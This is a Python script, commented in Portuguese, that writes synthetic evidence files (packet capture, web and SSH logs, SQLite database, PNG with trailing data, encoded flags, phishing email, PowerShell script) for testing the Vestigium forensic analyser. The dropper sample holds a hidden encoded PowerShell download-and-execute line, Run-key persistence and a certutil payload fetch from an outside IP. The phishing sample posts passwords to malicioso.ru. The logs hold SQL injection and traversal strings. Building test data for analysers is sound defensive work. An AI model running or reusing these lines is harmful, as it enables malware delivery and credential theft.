"""Gera um conjunto de evidencias sinteticas para demonstrar o Vestigium.

Cria arquivos benignos que acionam cada categoria de analisador, sem conter
qualquer artefato realmente malicioso. Uso: python examples/generate_samples.py

Autor: Joaquim Pedro de Morais Filho <j360074@hotmail.com>
"""
from __future__ import annotations

import base64
import os
import sqlite3
import struct
import zlib
from pathlib import Path

OUT = Path(__file__).parent / "samples"


def _pcap_header() -> bytes:
    return struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1)


def _pcap_packet(payload: bytes, src="10.0.0.5", dst="10.0.0.9",
                 sport=44000, dport=80, ts=0) -> bytes:
    def ip(a): return bytes(int(x) for x in a.split("."))
    eth = b"\xaa" * 6 + b"\xbb" * 6 + b"\x08\x00"
    l4 = struct.pack(">HH", sport, dport) + b"\x00" * 12 + b"\x50\x18\xff\xff\x00\x00\x00\x00" + payload
    tcp = l4
    total = 20 + len(tcp)
    iph = struct.pack(">BBHHHBBH", 0x45, 0, total, 1, 0, 64, 6, 0) + ip(src) + ip(dst)
    frame = eth + iph + tcp
    rec = struct.pack("<IIII", ts, 0, len(frame), len(frame)) + frame
    return rec


def gen_pcap():
    body = (b"GET /login?user=admin HTTP/1.1\r\nHost: portal.local\r\n"
            b"Authorization: Basic " + base64.b64encode(b"admin:senha123") +
            b"\r\nUser-Agent: sqlmap/1.7\r\n\r\nflag{trafego_em_claro}")
    data = _pcap_header()
    for i in range(8):
        data += _pcap_packet(body, ts=i * 30)  # intervalo regular -> beacon
    (OUT / "captura.pcap").write_bytes(data)


def gen_log():
    lines = [
        '203.0.113.7 - - [01/Jan/2026:10:00:01 +0000] "GET /?id=1 UNION SELECT password FROM users-- HTTP/1.1" 200 512 "-" "sqlmap/1.7"',
        '203.0.113.7 - - [01/Jan/2026:10:00:02 +0000] "GET /../../etc/passwd HTTP/1.1" 404 0 "-" "curl/8.0"',
        '198.51.100.4 - - [01/Jan/2026:10:00:03 +0000] "GET /search?q=<script>alert(1)</script> HTTP/1.1" 200 100 "-" "Mozilla/5.0"',
    ]
    for i in range(25):
        lines.append(f'198.51.100.9 - - [01/Jan/2026:10:0{i%6}:0{i%9} +0000] '
                     f'"GET /admin/{i}.php HTTP/1.1" 404 0 "-" "gobuster/3"')
    for i in range(12):
        lines.append(f"Jan  1 10:05:{i:02d} host sshd[1]: Failed password for invalid user root from 203.0.113.7 port 22 ssh2")
    (OUT / "acesso.log").write_text("\n".join(lines), encoding="utf-8")


def gen_sqlite():
    p = OUT / "app.db"
    if p.exists():
        p.unlink()
    con = sqlite3.connect(p)
    con.execute("CREATE TABLE users(id INTEGER, email TEXT, password_hash TEXT)")
    con.execute("INSERT INTO users VALUES(1,'admin@corp.local','5f4dcc3b5aa765d61d8327deb882cf99')")
    con.execute("INSERT INTO users VALUES(2,'vitima@corp.local','flag{registro_no_banco}')")
    con.execute("CREATE TABLE secret(k TEXT)")
    con.execute("INSERT INTO secret VALUES('apagar_depois@corp.local')")
    con.commit()
    con.execute("DROP TABLE secret")  # deixa vestigios nas paginas
    con.commit()
    con.close()


def gen_stego():
    # PNG minimo valido + dados apendados apos IEND
    png = (b"\x89PNG\r\n\x1a\n" +
           b"\x00\x00\x00\x0dIHDR" + struct.pack(">II", 1, 1) + b"\x08\x02\x00\x00\x00" +
           zlib.compress(b"\x00\x00\x00\x00")[:0] + b"\x90wS\xde" +
           b"\x00\x00\x00\x00IEND\xaeB`\x82")
    trailing = b"PK\x03\x04" + b"conteudo_oculto flag{apos_o_eof}"
    (OUT / "imagem.png").write_bytes(png + trailing)


def gen_crypto():
    secret = "flag{base64_aninhado}"
    once = base64.b64encode(secret.encode()).decode()
    twice = base64.b64encode(once.encode()).decode()
    rot = "".join(chr((ord(c) - 97 + 13) % 26 + 97) if c.isalpha() else c
                  for c in "flag{rot_treze}")
    (OUT / "desafio.txt").write_text(
        f"Camada 1 (base64 x2): {twice}\n"
        f"Camada 2 (ROT13): {rot}\n"
        f"hash md5: 5f4dcc3b5aa765d61d8327deb882cf99\n", encoding="utf-8")


def gen_phishing():
    eml = (
        "From: Suporte PayPal <seguranca@paypa1-secure.com>\r\n"
        "Return-Path: <bounce@malicioso.ru>\r\n"
        "Reply-To: <coleta@malicioso.ru>\r\n"
        "To: vitima@corp.local\r\n"
        "Subject: Sua conta foi suspensa - verifique imediatamente\r\n"
        "Authentication-Results: mx.local; spf=fail; dkim=none; dmarc=fail\r\n"
        "Content-Type: text/html\r\n\r\n"
        "<html><body><p>Sua conta sera bloqueada. Clique aqui urgente:</p>"
        '<a href="http://185.199.108.99/login">https://www.paypal.com/login</a>'
        '<form action="http://malicioso.ru/steal">'
        '<input type="password" name="pw"></form></body></html>\r\n'
    )
    (OUT / "email_suspeito.eml").write_text(eml, encoding="utf-8")


def gen_dropper():
    inner = "IEX (New-Object Net.WebClient).DownloadString('http://185.199.108.99/stage2.ps1')"
    enc = base64.b64encode(inner.encode("utf-16le")).decode()
    ps1 = (
        "# fatura.ps1\r\n"
        "$ErrorActionPreference='SilentlyContinue'\r\n"
        f"powershell -nop -w hidden -ep bypass -enc {enc}\r\n"
        "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Upd /d payload.exe\r\n"
        "certutil -urlcache -f http://185.199.108.99/p.exe p.exe\r\n"
    )
    (OUT / "fatura.ps1").write_text(ps1, encoding="utf-8")


def gen_warmup():
    (OUT / "leia-me.txt").write_text(
        "Bem-vindo ao desafio. Uma dica: flag{warmup_direto}\n"
        "Contato do autor: admin@corp.local\n", encoding="utf-8")


def main():
    OUT.mkdir(parents=True, exist_ok=True)
    gen_warmup(); gen_pcap(); gen_log(); gen_sqlite()
    gen_stego(); gen_crypto(); gen_phishing(); gen_dropper()
    print(f"Amostras geradas em: {OUT}")
    for f in sorted(os.listdir(OUT)):
        print("  -", f)


if __name__ == "__main__":
    main()
